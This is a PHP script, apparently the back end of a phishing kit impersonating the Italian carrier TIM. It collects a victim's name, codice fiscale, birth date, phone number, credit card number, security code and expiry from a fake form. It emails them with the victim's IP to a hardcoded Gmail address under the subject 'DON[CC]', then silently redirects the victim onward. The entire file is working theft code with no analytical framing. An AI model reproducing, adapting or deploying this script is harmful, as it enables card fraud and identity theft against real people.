<?php
$ip = getenv("REMOTE_ADDR");
$url = base64_decode($_GET['url']);
$hostname = gethostbyaddr($ip);
$message .= "[TIM-ROBO]\n";
$message .= "~~~~~~~~~~~~\n";
$message .= "Nome : ".$_POST['o1']."\n";
$message .= "Cognome : ".$_POST['o2']."\n";
$message .= "Codice Fiscale : ".$_POST['o3']."\n";
$message .= "Giorno : ".$_POST['o4']."\n";
$message .= "Mese : ".$_POST['o5']."\n";
$message .= "Anno : ".$_POST['o6']."\n";
$message .= "Num di telefono : ".$_POST['o7']."\n";
$message .= "Tipo di carta credito : ".$_POST['o8']."\n";
$message .= "Num di carta credito : ".$_POST['o9']."\n";
$message .= "Codice di sicurezza : ".$_POST['o10']."\n";
$message .= "Data di scadenza : Mese ".$_POST['o11']."\n";
$message .= "Data di scadenza : Anno".$_POST['o12']."\n";
$message .= "~~~~~~~~~~~~~~~~~~~~\n";
$message .= "[DON]\n";
$send = "louannedu490@gmail.com";
$subject = "DON[CC] $ip";
$headers = "From: [SAT]<sat@online.fr>";
mail($send,$subject,$message,$headers);

echo '<script language="Javascript">
<!--
document.location.replace("./progress.php");
// -->
</script>';
?>



